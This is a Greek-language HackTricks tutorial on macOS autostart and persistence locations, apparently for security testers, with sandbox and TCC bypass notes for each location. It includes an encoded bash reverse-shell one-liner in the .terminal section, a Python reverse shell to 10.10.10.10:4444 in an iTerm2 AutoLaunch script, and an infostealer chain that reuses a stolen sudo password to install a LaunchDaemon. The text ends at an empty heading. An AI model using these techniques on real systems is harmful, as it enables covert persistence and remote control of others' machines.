# Αυτόματη εκκίνηση macOS

{{#include ../banners/hacktricks-training.md}}

Αυτή η ενότητα βασίζεται σε μεγάλο βαθμό στη σειρά άρθρων [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Στόχος είναι να προσθέσει **περισσότερες τοποθεσίες Autostart** (αν είναι δυνατόν), να υποδείξει **ποιες τεχνικές εξακολουθούν να λειτουργούν** σήμερα με την πιο πρόσφατη έκδοση του macOS (13.4) και να καθορίσει τα απαιτούμενα **δικαιώματα**.

## Sandbox Bypass

> [!TIP]
> Εδώ μπορείτε να βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass**, οι οποίες σας επιτρέπουν να εκτελέσετε απλώς κάτι **γράφοντάς το σε ένα αρχείο** και **περιμένοντας** μια πολύ **συνηθισμένη** **ενέργεια**, ένα καθορισμένο **χρονικό διάστημα** ή μια **ενέργεια που συνήθως μπορείτε να εκτελέσετε** μέσα από ένα sandbox χωρίς να χρειάζεστε δικαιώματα root.

### Launchd

- Χρήσιμο για sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

- **`/Library/LaunchAgents`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`/Library/LaunchDaemons`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`~/Library/LaunchAgents`**
- **Trigger**: Επανασύνδεση
- **`~/Library/LaunchDemons`**
- **Trigger**: Επανασύνδεση

> [!TIP]
> Ένα ενδιαφέρον γεγονός είναι ότι το **`launchd`** διαθέτει μια ενσωματωμένη property list στην ενότητα Mach-O `__Text.__config`, η οποία περιέχει άλλες γνωστές υπηρεσίες που πρέπει να εκκινήσει το launchd. Επιπλέον, αυτές οι υπηρεσίες μπορούν να περιέχουν τα `RequireSuccess`, `RequireRun` και `RebootOnSuccess`, γεγονός που σημαίνει ότι πρέπει να εκτελεστούν και να ολοκληρωθούν επιτυχώς.
>
> Φυσικά, δεν μπορεί να τροποποιηθεί λόγω του code signing.

#### Περιγραφή & Exploitation

Το **`launchd`** είναι η **πρώτη** **διεργασία** που εκτελείται από τον πυρήνα του macOS κατά την εκκίνηση και η τελευταία που τερματίζει κατά τον τερματισμό λειτουργίας. Θα πρέπει να έχει πάντα το **PID 1**. Αυτή η διεργασία θα **διαβάσει και θα εκτελέσει** τις διαμορφώσεις που υποδεικνύονται στα **ASEP** **plists** στις εξής τοποθεσίες:

- `/Library/LaunchAgents`: Per-user agents εγκατεστημένα από τον διαχειριστή
- `/Library/LaunchDaemons`: System-wide daemons εγκατεστημένα από τον διαχειριστή
- `/System/Library/LaunchAgents`: Per-user agents που παρέχονται από την Apple.
- `/System/Library/LaunchDaemons`: System-wide daemons που παρέχονται από την Apple.

Όταν ένας χρήστης συνδέεται, τα plists που βρίσκονται στις `/Users/$USER/Library/LaunchAgents` και `/Users/$USER/Library/LaunchDemons` εκκινούνται με τα **δικαιώματα του συνδεδεμένου χρήστη**.

Η **κύρια διαφορά μεταξύ agents και daemons είναι ότι οι agents φορτώνονται όταν ο χρήστης συνδέεται, ενώ οι daemons φορτώνονται κατά την εκκίνηση του συστήματος** (καθώς υπάρχουν υπηρεσίες όπως το ssh που πρέπει να εκτελούνται πριν αποκτήσει οποιοσδήποτε χρήστης πρόσβαση στο σύστημα). Επίσης, οι agents μπορούν να χρησιμοποιούν GUI, ενώ οι daemons πρέπει να εκτελούνται στο παρασκήνιο.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Υπάρχουν περιπτώσεις όπου ένας **agent πρέπει να εκτελεστεί πριν από το login του χρήστη**, και αυτοί ονομάζονται **PreLoginAgents**. Για παράδειγμα, αυτό είναι χρήσιμο για την παροχή βοηθητικής τεχνολογίας κατά το login. Μπορούν επίσης να βρεθούν στο `/Library/LaunchAgents`(δείτε [**εδώ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ένα παράδειγμα).

> [!TIP]
> Τα νέα αρχεία ρυθμίσεων Daemons ή Agents θα **φορτωθούν μετά την επόμενη επανεκκίνηση ή με τη χρήση της εντολής** `launchctl load <target.plist>` Είναι **επίσης δυνατή η φόρτωση αρχείων .plist χωρίς αυτή την επέκταση** με `launchctl -F <file>` (ωστόσο, αυτά τα αρχεία plist δεν θα φορτώνονται αυτόματα μετά την επανεκκίνηση).\
> Είναι επίσης δυνατή η **εκφόρτωση** με `launchctl unload <target.plist>` (η διεργασία που υποδεικνύεται από αυτό θα τερματιστεί),
>
> Για να **βεβαιωθείτε ότι δεν υπάρχει** **τίποτα** (όπως ένα override) που **εμποδίζει** έναν **Agent** ή **Daemon** **να εκτελεστεί**, εκτελέστε: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Παραθέστε όλους τους agents και daemons που έχουν φορτωθεί από τον τρέχοντα χρήστη:
```bash
launchctl list
```
#### Παράδειγμα κακόβουλης αλυσίδας LaunchDaemon (επαναχρησιμοποίηση κωδικού πρόσβασης)

Ένα πρόσφατο macOS infostealer επαναχρησιμοποίησε έναν **υποκλεμμένο κωδικό πρόσβασης sudo** για να εγκαταστήσει έναν user agent και ένα root LaunchDaemon:

- Εγγραφή του loop του agent στο `~/.agent` και μετατροπή του σε executable.
- Δημιουργία ενός plist στο `/tmp/starter` που δείχνει σε αυτόν τον agent.
- Επαναχρησιμοποίηση του κλεμμένου κωδικού πρόσβασης με `sudo -S` για την αντιγραφή του στο `/Library/LaunchDaemons/com.finder.helper.plist`, τον ορισμό του ως `root:wheel` και τη φόρτωσή του με `launchctl load`.
- Αθόρυβη εκκίνηση του agent μέσω `nohup ~/.agent >/dev/null 2>&1 &` για αποσύνδεση του output.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Αν ένα plist ανήκει σε έναν χρήστη, ακόμη κι αν βρίσκεται σε system-wide φακέλους daemon, το **task θα εκτελεστεί ως ο χρήστης** και όχι ως root. Αυτό μπορεί να αποτρέψει ορισμένες επιθέσεις privilege escalation.

#### Περισσότερες πληροφορίες για το launchd

Το **`launchd`** είναι η **πρώτη διεργασία σε user mode** που εκκινείται από τον **kernel**. Η εκκίνηση της διεργασίας πρέπει να είναι **επιτυχής** και αυτή **δεν μπορεί να τερματιστεί ή να καταρρεύσει**. Είναι επίσης **προστατευμένη** από ορισμένα **σήματα τερματισμού**.

Ένα από τα πρώτα πράγματα που θα έκανε το `launchd` είναι να **εκκινήσει** όλους τους **daemons**, όπως:

- **Daemons χρονοδιακόπτη**, με βάση τον χρόνο εκτέλεσης:
- atd (`com.apple.atrun.plist`): Έχει `StartInterval` 30min
- crond (`com.apple.systemstats.daily.plist`): Έχει `StartCalendarInterval` για εκκίνηση στις 00:15
- **Network daemons**, όπως:
- `org.cups.cups-lpd`: Ακούει σε TCP (`SockType: stream`) με `SockServiceName: printer`
- Το SockServiceName πρέπει να είναι είτε port είτε service από το `/etc/services`
- `com.apple.xscertd.plist`: Ακούει σε TCP στη θύρα 1640
- **Path daemons**, που εκτελούνται όταν αλλάζει ένα καθορισμένο path:
- `com.apple.postfix.master`: Ελέγχει το path `/etc/postfix/aliases`
- **Daemons ειδοποιήσεων IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Υποδεικνύει στην καταχώριση `MachServices` το όνομα `com.apple.xscertd.helper`
- **UserEventAgent:**
- Αυτό διαφέρει από το προηγούμενο. Κάνει το launchd να κάνει spawn εφαρμογών ως απόκριση σε συγκεκριμένα events. Ωστόσο, σε αυτή την περίπτωση, το κύριο binary που εμπλέκεται δεν είναι το `launchd`, αλλά το `/usr/libexec/UserEventAgent`. Φορτώνει plugins από τον SIP restricted φάκελο `/System/Library/UserEventPlugins/`, όπου κάθε plugin υποδεικνύει τον initialiser του στο key `XPCEventModuleInitializer` ή, στην περίπτωση παλαιότερων plugins, στο dict `CFPluginFactories`, κάτω από το key `FB86416D-6164-2070-726F-70735C216EC0` του `Info.plist` του.

### αρχεία εκκίνησης shell

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Αναφορά (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να βρείτε μια εφαρμογή με TCC bypass που εκτελεί ένα shell το οποίο φορτώνει αυτά τα αρχεία

#### Τοποθεσίες

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Άνοιγμα terminal με zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Άνοιγμα terminal με zsh
- Απαιτείται root
- **`~/.zlogout`**
- **Trigger**: Έξοδος από terminal με zsh
- **`/etc/zlogout`**
- **Trigger**: Έξοδος από terminal με zsh
- Απαιτείται root
- Ενδεχομένως υπάρχουν περισσότερα στο: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Άνοιγμα terminal με bash
- `/etc/profile` (δεν λειτούργησε)
- `~/.profile` (δεν λειτούργησε)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Αναμένεται να ενεργοποιείται με xterm, αλλά **δεν είναι εγκατεστημένο** και, ακόμη και μετά την εγκατάστασή του, εμφανίζεται το εξής error: xterm: `DISPLAY is not set`

#### Περιγραφή & Exploitation

Κατά την εκκίνηση ενός shell environment, όπως τα `zsh` ή `bash`, **εκτελούνται ορισμένα αρχεία εκκίνησης**. Το macOS χρησιμοποιεί επί του παρόντος το `/bin/zsh` ως default shell. Αυτό το shell αποκτάται αυτόματα όταν εκκινείται η εφαρμογή Terminal ή όταν γίνεται πρόσβαση σε μια συσκευή μέσω SSH. Παρότι τα `bash` και `sh` υπάρχουν επίσης στο macOS, πρέπει να κληθούν ρητά για να χρησιμοποιηθούν.

Η man page του zsh, την οποία μπορούμε να διαβάσουμε με την εντολή **`man zsh`**, περιέχει μια εκτενή περιγραφή των αρχείων εκκίνησης.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Εφαρμογές που ανοίγουν ξανά

> [!CAUTION]
> Η ρύθμιση του υποδεικνυόμενου exploitation και η αποσύνδεση και επανασύνδεση ή ακόμη και η επανεκκίνηση δεν λειτούργησαν για μένα ώστε να εκτελεστεί η εφαρμογή. (Η εφαρμογή δεν εκτελούνταν· ίσως χρειάζεται να εκτελείται όταν πραγματοποιούνται αυτές οι ενέργειες.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Επανεκκίνηση που ανοίγει ξανά τις εφαρμογές

#### Περιγραφή & Exploitation

Όλες οι εφαρμογές που θα ανοίξουν ξανά βρίσκονται μέσα στο plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Επομένως, κάντε τις εφαρμογές που ανοίγουν ξανά να εκκινήσουν τη δική σας εφαρμογή· απλώς πρέπει να **προσθέσετε την εφαρμογή σας στη λίστα**.

Το UUID μπορεί να βρεθεί εμφανίζοντας τα περιεχόμενα αυτού του directory ή με την εντολή `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Για να ελέγξετε τις εφαρμογές που θα ανοίξουν ξανά, μπορείτε να εκτελέσετε:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Για να **προσθέσετε μια εφαρμογή σε αυτήν τη λίστα** μπορείτε να χρησιμοποιήσετε:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Προτιμήσεις Terminal

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
- Χρήση του Terminal για την απόκτηση δικαιωμάτων FDA του χρήστη

#### Τοποθεσία

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Άνοιγμα του Terminal

#### Περιγραφή & Εκμετάλλευση

Στο **`~/Library/Preferences`** αποθηκεύονται οι προτιμήσεις του χρήστη για τις εφαρμογές. Ορισμένες από αυτές τις προτιμήσεις μπορούν να περιέχουν configuration για **εκτέλεση άλλων εφαρμογών/scripts**.

Για παράδειγμα, το Terminal μπορεί να εκτελέσει μια εντολή κατά την εκκίνηση:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Αυτό το config αντικατοπτρίζεται στο αρχείο **`~/Library/Preferences/com.apple.Terminal.plist`** ως εξής:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Επομένως, αν μπορούσε να αντικατασταθεί το **`plist`** των προτιμήσεων του terminal στο σύστημα, θα μπορούσε να χρησιμοποιηθεί η λειτουργικότητα **`open`** για να **ανοίξει το terminal και να εκτελεστεί αυτή η εντολή**.

Μπορείτε να το προσθέσετε από το CLI με:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Άλλες επεκτάσεις αρχείων

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Χρήση του Terminal για απόκτηση FDA permissions του χρήστη που το εκτελεί

#### Τοποθεσία

- **Οπουδήποτε**
- **Trigger**: Άνοιγμα του Terminal

#### Περιγραφή & Exploitation

Αν δημιουργήσετε ένα [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) και το ανοίξετε, η **Terminal application** θα εκκινηθεί αυτόματα για να εκτελέσει τις εντολές που περιέχονται σε αυτό. Αν η Terminal app διαθέτει ειδικά privileges (όπως TCC), η εντολή σας θα εκτελεστεί με αυτά τα ειδικά privileges.

Δοκιμάστε το με:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Θα μπορούσατε επίσης να χρησιμοποιήσετε τις επεκτάσεις **`.command`**, **`.tool`**, με περιεχόμενο κανονικών shell scripts, και θα ανοίγουν επίσης από το Terminal.

> [!CAUTION]
> Αν το Terminal έχει **Full Disk Access**, θα μπορεί να ολοκληρώσει αυτή την ενέργεια (σημειώστε ότι η εντολή που εκτελείται θα είναι ορατή σε ένα παράθυρο του Terminal).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ενδέχεται να αποκτήσετε επιπλέον πρόσβαση στο TCC

#### Τοποθεσία

- **`/Library/Audio/Plug-Ins/HAL`**
- Απαιτείται Root
- **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
- **`/Library/Audio/Plug-ins/Components`**
- Απαιτείται Root
- **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
- **`/System/Library/Components`**
- Απαιτείται Root
- **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή

#### Περιγραφή

Σύμφωνα με τα προηγούμενα writeups, είναι δυνατή η **μεταγλώττιση ορισμένων audio plugins** και η φόρτωσή τους.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ενδέχεται να αποκτήσετε επιπλέον πρόσβαση στο TCC

#### Τοποθεσία

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Περιγραφή & Exploitation

Τα QuickLook plugins μπορούν να εκτελεστούν όταν **ενεργοποιήσετε την προεπισκόπηση ενός αρχείου** (πατώντας το πλήκτρο διαστήματος με το αρχείο επιλεγμένο στο Finder) και έχει εγκατασταθεί ένα **plugin που υποστηρίζει τον συγκεκριμένο τύπο αρχείου**.

Είναι δυνατή η μεταγλώττιση ενός δικού σας QuickLook plugin, η τοποθέτησή του σε μία από τις προηγούμενες τοποθεσίες για να φορτωθεί και, στη συνέχεια, η μετάβαση σε ένα υποστηριζόμενο αρχείο και το πάτημα του πλήκτρου διαστήματος για την ενεργοποίησή του.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Αυτό δεν λειτούργησε για εμένα, ούτε με το user LoginHook ούτε με το root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Πρέπει να μπορείτε να εκτελέσετε κάτι όπως `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Βρίσκεται στη διεύθυνση `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Έχουν καταργηθεί, αλλά μπορούν να χρησιμοποιηθούν για την εκτέλεση εντολών όταν ένας χρήστης συνδέεται.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Αυτή η ρύθμιση αποθηκεύεται στο `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Για να το διαγράψετε:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Το root user αποθηκεύεται στο **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Εδώ μπορείτε να βρείτε start locations χρήσιμα για **sandbox bypass**, τα οποία σας επιτρέπουν να εκτελέσετε απλώς κάτι **γράφοντάς το σε ένα αρχείο** και **αναμένοντας όχι ιδιαίτερα συνηθισμένες συνθήκες**, όπως την εγκατάσταση συγκεκριμένων **προγραμμάτων**, «ασυνήθιστες» ενέργειες χρηστών ή περιβάλλοντα.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Χρήσιμο για sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να μπορείτε να εκτελέσετε το `crontab` binary
- Ή να είστε root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Απαιτούνται δικαιώματα root για άμεση πρόσβαση εγγραφής. Δεν απαιτούνται δικαιώματα root αν μπορείτε να εκτελέσετε το `crontab <file>`
- **Trigger**: Εξαρτάται από το cron job

#### Περιγραφή & Exploitation

Παραθέστε τα cron jobs του **τρέχοντος χρήστη** με:
```bash
crontab -l
```
Μπορείτε επίσης να δείτε όλα τα cron jobs των χρηστών στα **`/usr/lib/cron/tabs/`** και **`/var/at/tabs/`** (απαιτούνται δικαιώματα root).

Στο MacOS, αρκετοί φάκελοι που εκτελούν scripts με **συγκεκριμένη συχνότητα** μπορούν να βρεθούν στα εξής σημεία:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Εκεί μπορείτε να βρείτε τα συνήθη **cron** **jobs**, τα **at** **jobs** (δεν χρησιμοποιούνται πολύ) και τα **periodic** **jobs** (χρησιμοποιούνται κυρίως για τον καθαρισμό προσωρινών αρχείων). Τα daily periodic jobs μπορούν να εκτελεστούν, για παράδειγμα, με: `periodic daily`.

Για να προσθέσετε προγραμματιστικά ένα **user cronjob**, μπορείτε να χρησιμοποιήσετε:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Το iTerm2 είχε παραχωρημένα TCC permissions

#### Τοποθεσίες

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Άνοιγμα του iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Άνοιγμα του iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Άνοιγμα του iTerm

#### Περιγραφή & Exploitation

Τα Scripts που είναι αποθηκευμένα στο **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** θα εκτελεστούν. Για παράδειγμα:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ή:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Το script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** θα εκτελείται επίσης:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Οι προτιμήσεις του iTerm2 που βρίσκονται στο **`~/Library/Preferences/com.googlecode.iterm2.plist`** μπορούν να **υποδεικνύουν μια εντολή προς εκτέλεση** όταν ανοίγει το τερματικό iTerm2.

Αυτή η ρύθμιση μπορεί να διαμορφωθεί στις ρυθμίσεις του iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Και η εντολή αποτυπώνεται στις προτιμήσεις:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Μπορείτε να ορίσετε την εντολή προς εκτέλεση με:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Είναι πολύ πιθανό να υπάρχουν **άλλοι τρόποι κατάχρησης των preferences του iTerm2** για την εκτέλεση arbitrary commands.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, το xbar πρέπει να είναι εγκατεστημένο
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ζητά permissions Accessibility

#### Τοποθεσία

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Μόλις εκτελεστεί το xbar

#### Περιγραφή

Αν είναι εγκατεστημένο το δημοφιλές πρόγραμμα [**xbar**](https://github.com/matryer/xbar), είναι δυνατή η εγγραφή ενός shell script στο **`~/Library/Application\ Support/xbar/plugins/`**, το οποίο θα εκτελεστεί κατά την εκκίνηση του xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, το Hammerspoon πρέπει να είναι εγκατεστημένο
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
- Ζητά δικαιώματα Accessibility

#### Τοποθεσία

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Μόλις εκτελεστεί το hammerspoon

#### Περιγραφή

Το [**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) λειτουργεί ως πλατφόρμα αυτοματοποίησης για το **macOS**, αξιοποιώντας τη **γλώσσα scripting LUA** για τις λειτουργίες του. Αξιοσημείωτο είναι ότι υποστηρίζει την ενσωμάτωση πλήρους κώδικα AppleScript και την εκτέλεση shell scripts, επεκτείνοντας σημαντικά τις δυνατότητες scripting του.

Η εφαρμογή αναζητά ένα μοναδικό αρχείο, το `~/.hammerspoon/init.lua`, και κατά την εκκίνησή της εκτελείται το script.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

